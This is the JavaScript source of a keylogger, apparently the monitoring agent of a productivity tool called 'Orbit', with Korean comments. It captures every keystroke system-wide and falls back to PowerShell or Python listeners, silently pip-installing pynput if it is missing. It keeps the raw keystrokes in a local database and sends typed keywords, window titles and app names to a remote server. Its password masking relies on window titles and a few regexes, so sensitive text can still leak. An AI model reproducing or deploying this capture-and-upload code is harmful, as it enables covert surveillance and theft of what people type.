/**
 * keylogger.js
 * ─────────────────────────────────────────────────────────────
 * 로컬 키입력 수집 + 규칙 기반 분석 에이전트
 *
 * 프라이버시 원칙:
 *   - 원문 키스트로크는 로컬 SQLite에만 저장
 *   - 30초마다 규칙 기반 분석 → 결과(패턴/인사이트)만 서버 전송
 *   - 비밀번호 필드 자동 감지 후 마스킹 (*** 처리)
 *   - 언제든 OFF 가능 (ORBIT_KEYLOG=false 환경변수)
 *
 * AI 분석은 서버(Haiku)에서 처리 — Ollama 불필요
 *
 * 실행:
 *   node src/keylogger.js
 * ─────────────────────────────────────────────────────────────
 */
'use strict';

const fs      = require('fs');
const path    = require('path');
const http    = require('http');
const https   = require('https');
const os      = require('os');

// ── ~/.orbit-config.json 읽기 ──────────────────────────────
function readOrbitConfig() {
  try {
    const p = path.join(os.homedir(), '.orbit-config.json');
    if (fs.existsSync(p)) return JSON.parse(fs.readFileSync(p, 'utf8'));
  } catch {}
  return {};
}
const _orbitCfg     = readOrbitConfig();
const RAILWAY_URL   = process.env.ORBIT_SERVER_URL || _orbitCfg.serverUrl || null;
const RAILWAY_TOKEN = process.env.ORBIT_TOKEN      || _orbitCfg.token     || '';

// ── 설정 ────────────────────────────────────────────────────
const ENABLED         = process.env.ORBIT_KEYLOG !== 'false';
const LOCAL_PORT      = parseInt(process.env.MINDMAP_PORT || '4747');
const FLUSH_INTERVAL  = 30000;   // 30초마다 분석
const MIN_CHARS       = 20;      // 최소 20자 이상 쌓였을 때 분석
const MAX_BUFFER      = 2000;    // 버퍼 최대 2000자

const BASE_DIR   = path.resolve(__dirname);
const DB_PATH    = path.join(BASE_DIR, 'data', 'keylog.db');
const LOG_FILE   = path.join(BASE_DIR, 'keylog.log');

try { fs.mkdirSync(path.join(BASE_DIR, 'data'), { recursive: true }); } catch {}

function log(msg) {
  try { fs.appendFileSync(LOG_FILE, `[${new Date().toISOString()}] ${msg}\n`); } catch {}
}

if (!ENABLED) {
  log('키로거 비활성화 (ORBIT_KEYLOG=false)');
  process.exit(0);
}

// ── SQLite 초기화 ────────────────────────────────────────────
function initDb() {
  try {
    const Database = require('better-sqlite3');
    const db = new Database(DB_PATH);
    db.pragma('journal_mode = WAL');
    db.exec(`
      CREATE TABLE IF NOT EXISTS keylog_sessions (
        id         TEXT PRIMARY KEY,
        started_at TEXT,
        app        TEXT,
        window     TEXT
      );
      CREATE TABLE IF NOT EXISTS keylog_chunks (
        id          TEXT PRIMARY KEY,
        session_id  TEXT,
        text        TEXT NOT NULL,
        captured_at TEXT,
        analyzed    INTEGER DEFAULT 0
      );
      CREATE TABLE IF NOT EXISTS keylog_insights (
        id          TEXT PRIMARY KEY,
        chunk_ids   TEXT,
        insight     TEXT NOT NULL,
        created_at  TEXT
      );
    `);
    return db;
  } catch (e) {
    log(`DB 초기화 실패: ${e.message}`);
    return null;
  }
}

// ── 키 버퍼 ─────────────────────────────────────────────────
let _buffer        = '';
let _isPassword    = false;
let _flushTimer    = null;
let _sessionId     = `ks-${Date.now()}`;
let _db            = null;
let _activeApp     = '';
let _activeTitle   = '';

const SPECIAL_KEYS = {
  'Return':    '\n',
  'space':     ' ',
  'Tab':       '\t',
  'BackSpace': '⌫',
  'Delete':    '⌦',
  'Escape':    '[ESC]',
};

const PASSWORD_APPS = ['KeePass', '1Password', 'Bitwarden', 'LastPass', 'Samsung Pass'];
function checkPasswordContext(windowTitle) {
  if (!windowTitle) return false;
  const lower = windowTitle.toLowerCase();
  return lower.includes('password') || lower.includes('비밀번호') ||
    PASSWORD_APPS.some(app => lower.includes(app.toLowerCase()));
}

// ── 활성 윈도우 폴링 (2초마다) ─────────────────────────────
function pollActiveWindow() {
  const { exec } = require('child_process');
  const platform = process.platform;

  setInterval(() => {
    if (platform === 'win32') {
      const ps = `Add-Type @"
using System; using System.Runtime.InteropServices;
public class WinAPI {
  [DllImport("user32")] public static extern IntPtr GetForegroundWindow();
  [DllImport("user32")] public static extern int GetWindowText(IntPtr h,System.Text.StringBuilder s,int m);
  [DllImport("user32")] public static extern uint GetWindowThreadProcessId(IntPtr h,out uint p);
}
"@
$h=[WinAPI]::GetForegroundWindow(); $sb=New-Object System.Text.StringBuilder 256; [WinAPI]::GetWindowText($h,$sb,256)|Out-Null; $pid=0; [WinAPI]::GetWindowThreadProcessId($h,[ref]$pid)|Out-Null; $proc=Get-Process -Id $pid -ErrorAction SilentlyContinue; Write-Output ($proc.ProcessName+"|||"+$sb.ToString())`;
      exec(`powershell -Command "${ps.replace(/"/g, '\\"')}"`, (err, stdout) => {
        if (!err && stdout) {
          const [app, title] = stdout.trim().split('|||');
          _activeApp   = (app || '').trim();
          _activeTitle = (title || '').trim();
          _isPassword  = checkPasswordContext(_activeTitle);
        }
      });
    } else if (platform === 'darwin') {
      const script = 'tell application "System Events" to set fApp to name of first application process whose frontmost is true\nreturn fApp';
      exec(`osascript -e '${script.replace(/\n/g, "' -e '")}'`, (err, stdout) => {
        if (!err) _activeApp = (stdout || '').trim();
      });
    }
  }, 2000);
}

// ── uiohook-napi 키 캡처 ────────────────────────────────────
function startCapture() {
  try {
    const { uIOhook } = require('uiohook-napi');

    uIOhook.on('keydown', (event) => {
      if (_isPassword) return;

      let char = '';
      if (SPECIAL_KEYS[event.keycode]) {
        char = SPECIAL_KEYS[event.keycode];
      } else if (event.keychar) {
        char = String.fromCharCode(event.keychar);
      }
      if (!char) return;

      _buffer += char;
      if (_buffer.length >= MAX_BUFFER) flushBuffer();
    });

    uIOhook.start();
    log('uiohook-napi 시작');
    return true;
  } catch (e) {
    log(`uiohook-napi 로드 실패: ${e.message} — 대체 방법 시도`);
    return startFallbackCapture();
  }
}

// ── 대체 캡처 ────────────────────────────────────────────────
function startFallbackCapture() {
  const { spawn } = require('child_process');

  if (process.platform === 'win32') {
    log('Windows: PowerShell 키 캡처 시작');
    const ps = spawn('powershell', ['-NoProfile', '-NonInteractive', '-Command', `
      Add-Type -AssemblyName System.Windows.Forms
      $wsh = New-Object -ComObject WScript.Shell
      while ($true) {
        $key = [System.Console]::ReadKey($true)
        Write-Output $key.KeyChar
        Start-Sleep -Milliseconds 10
      }
    `], { stdio: ['ignore', 'pipe', 'ignore'] });
    ps.stdout.on('data', data => {
      _buffer += data.toString();
      if (_buffer.length >= MAX_BUFFER) flushBuffer();
    });
    ps.on('error', () => log('PowerShell 캡처 실패'));
    return true;
  }

  if (process.platform === 'darwin' || process.platform === 'linux') {
    const script = `
import sys
try:
    from pynput import keyboard
    def on_press(key):
        try: sys.stdout.write(key.char or ''); sys.stdout.flush()
        except: pass
    with keyboard.Listener(on_press=on_press) as l: l.join()
except ImportError:
    import subprocess; subprocess.run(['pip3','install','pynput','-q'])`;
    const py = spawn('python3', ['-c', script], { stdio: ['ignore', 'pipe', 'ignore'] });
    py.stdout.on('data', data => {
      _buffer += data.toString();
      if (_buffer.length >= MAX_BUFFER) flushBuffer();
    });
    py.on('error', () => log('Python 캡처 실패'));
    return true;
  }

  log('지원되지 않는 플랫폼');
  return false;
}

// ── 규칙 기반 분석 (Ollama 불필요) ──────────────────────────
function analyzeLocally(text) {
  const masked = text
    .replace(/\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/g, '****-****-****-****')
    .replace(/\b\d{6,}\b/g, '******')
    .replace(/password[^\s]*/gi, '***')
    .replace(/비밀번호[^\s]*/g, '***');

  // 언어 판별
  const korean  = (masked.match(/[\uAC00-\uD7AF]/g) || []).length;
  const english = (masked.match(/[a-zA-Z]/g) || []).length;
  const code    = (masked.match(/[{}();\[\]=<>\/\\|&!@#$%^*`~]/g) || []).length;
  let language = '혼합';
  if (code > english * 0.3 && code > 10) language = '코드';
  else if (korean > english) language = '한국어';
  else if (english > korean) language = '영어';

  // 활동 분류
  let activity = '기타';
  const appLower = (_activeApp + ' ' + _activeTitle).toLowerCase();
  if (/vscode|cursor|vim|emacs|sublime|xcode|idea/.test(appLower)) activity = '코딩';
  else if (/word|한글|hwp|docs|notion|obsidian|pages/.test(appLower)) activity = '문서작성';
  else if (/excel|sheets|numbers|calc/.test(appLower)) activity = '스프레드시트';
  else if (/powerpoint|keynote|impress/.test(appLower)) activity = '프레젠테이션';
  else if (/premiere|davinci|final.?cut|after.?effects|capcut/.test(appLower)) activity = '영상편집';
  else if (/photoshop|illustrator|figma|sketch|xd|canva/.test(appLower)) activity = '디자인';
  else if (/chrome|edge|firefox|safari|brave/.test(appLower)) activity = '웹브라우징';
  else if (/outlook|mail|gmail|thunderbird/.test(appLower)) activity = '이메일';
  else if (/slack|discord|teams|카카오|telegram/.test(appLower)) activity = '채팅';
  else if (/terminal|powershell|cmd|iterm|warp/.test(appLower)) activity = '터미널';

  // 키워드 추출 (공백 분리 → 2자 이상 → 빈도 순)
  const words = masked.replace(/[^가-힣a-zA-Z0-9\s]/g, ' ').split(/\s+/).filter(w => w.length >= 2);
  const freq  = {};
  words.forEach(w => { freq[w] = (freq[w] || 0) + 1; });
  const keywords = Object.entries(freq).sort((a, b) => b[1] - a[1]).slice(0, 5).map(e => e[0]);

  return {
    topic:    `${_activeApp || '알 수 없는 앱'} 작업`,
    language,
    activity,
    app:      _activeApp,
    window:   _activeTitle,
    keywords,
    charCount: text.length,
    context:  `${activity} — ${_activeApp} (${text.length}자 입력)`,
  };
}

// ── 버퍼 플러시 → 저장 + 분석 ──────────────────────────────
function flushBuffer() {
  if (_buffer.trim().length < MIN_CHARS) {
    _buffer = '';
    return;
  }

  const text = _buffer;
  _buffer = '';

  if (!_db) return;

  try {
    const chunkId = `kc-${Date.now()}-${Math.random().toString(36).slice(2,6)}`;
    _db.prepare(`
      INSERT INTO keylog_chunks (id, session_id, text, captured_at)
      VALUES (?, ?, ?, ?)
    `).run(chunkId, _sessionId, text, new Date().toISOString());

    log(`청크 저장: ${text.length}자 (id=${chunkId})`);

    // 규칙 기반 분석
    const insight = analyzeLocally(text);

    const insightId = `ki-${Date.now()}`;
    _db.prepare(`
      INSERT INTO keylog_insights (id, chunk_ids, insight, created_at)
      VALUES (?, ?, ?, ?)
    `).run(insightId, chunkId, JSON.stringify(insight), new Date().toISOString());
    _db.prepare(`UPDATE keylog_chunks SET analyzed = 1 WHERE id = ?`).run(chunkId);

    log(`분석 완료: ${insight.topic} (${insight.activity})`);

    // 서버로 인사이트 전송 (원문 없이)
    sendInsightToServer(insight, insightId);
  } catch (e) {
    log(`플러시 오류: ${e.message}`);
  }
}

// ── 인사이트 전송 (로컬 → Railway 폴백) ─────────────────────
function sendInsightToServer(insight, insightId) {
  const payload = JSON.stringify({
    type:      'keylog_insight',
    insightId,
    insight,
    timestamp: new Date().toISOString(),
  });

  try {
    const req = http.request({
      hostname: '127.0.0.1',
      port:     LOCAL_PORT,
      path:     '/api/keylog-insight',
      method:   'POST',
      headers:  { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
    }, r => r.resume());
    req.on('error', () => sendInsightToRailway(insight, insightId));
    req.setTimeout(2000, () => { req.destroy(); sendInsightToRailway(insight, insightId); });
    req.write(payload);
    req.end();
  } catch {
    sendInsightToRailway(insight, insightId);
  }
}

function sendInsightToRailway(insight, insightId) {
  if (!RAILWAY_URL) return;

  try {
    const event = {
      id:        insightId,
      type:      'keylog.insight',
      source:    'keylogger',
      sessionId: `kl-${Date.now()}`,
      userId:    'local',
      channelId: 'keylog',
      timestamp: new Date().toISOString(),
      data:      { insight },
      metadata:  { analyzer: 'rule-based' },
    };

    const body    = JSON.stringify({ events: [event] });
    const url     = new URL('/api/hook', RAILWAY_URL);
    const isHttps = url.protocol === 'https:';
    const mod     = isHttps ? https : http;
    const headers = {
      'Content-Type':   'application/json',
      'Content-Length': Buffer.byteLength(body),
    };
    if (RAILWAY_TOKEN) headers['Authorization'] = `Bearer ${RAILWAY_TOKEN}`;

    const req = mod.request({
      hostname: url.hostname,
      port:     url.port || (isHttps ? 443 : 80),
      path:     url.pathname,
      method:   'POST',
      headers,
    }, r => { r.resume(); log(`Railway 전송 완료: ${insight.topic}`); });

    req.on('error', e => log(`Railway 전송 실패: ${e.message}`));
    req.setTimeout(8000, () => req.destroy());
    req.write(body);
    req.end();
  } catch (e) {
    log(`Railway 전송 예외: ${e.message}`);
  }
}

// ── 메인 ────────────────────────────────────────────────────
async function main() {
  log('=== Orbit 키로거 시작 ===');
  log('모드: 로컬 저장 + 규칙 분석 (Ollama 불필요, AI 분석은 서버 Haiku)');

  _db = initDb();
  if (!_db) { log('DB 초기화 실패 — 종료'); process.exit(1); }

  _db.prepare(`INSERT INTO keylog_sessions (id, started_at) VALUES (?, ?)`)
    .run(_sessionId, new Date().toISOString());

  // 활성 윈도우 폴링 시작
  pollActiveWindow();

  // 키 캡처 시작
  const started = startCapture();
  if (!started) { log('캡처 시작 실패 — 종료'); process.exit(1); }

  // 주기적 플러시
  _flushTimer = setInterval(flushBuffer, FLUSH_INTERVAL);

  process.on('SIGINT',  () => { flushBuffer(); process.exit(0); });
  process.on('SIGTERM', () => { flushBuffer(); process.exit(0); });

  log('캡처 중... (Ctrl+C로 종료)');
}

main();
